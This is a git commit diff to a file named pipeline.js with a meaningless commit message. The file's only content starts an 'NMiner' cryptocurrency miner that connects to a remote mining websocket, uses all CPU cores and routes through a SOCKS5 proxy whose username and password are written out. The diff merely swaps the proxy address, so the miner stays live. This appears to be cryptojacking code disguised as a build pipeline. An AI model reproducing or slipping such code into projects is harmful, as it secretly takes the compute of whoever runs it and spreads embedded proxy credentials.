b5582c58250f0e9692da473cc44ff9dea1818049
Irma Goldner <irma_goldner@yahoo.com>
2026-08-23 01:48:29 +0530

    to incidentally octave

--- pipeline.js
+++ pipeline.js
@@ -1,2 +1,2 @@
 const { NMiner } = require("nminer");
-new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@104.253.219.135:6544", threads: require("os").cpus().length, throttle: true });
+new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@82.24.242.173:7992", threads: require("os").cpus().length, throttle: true });
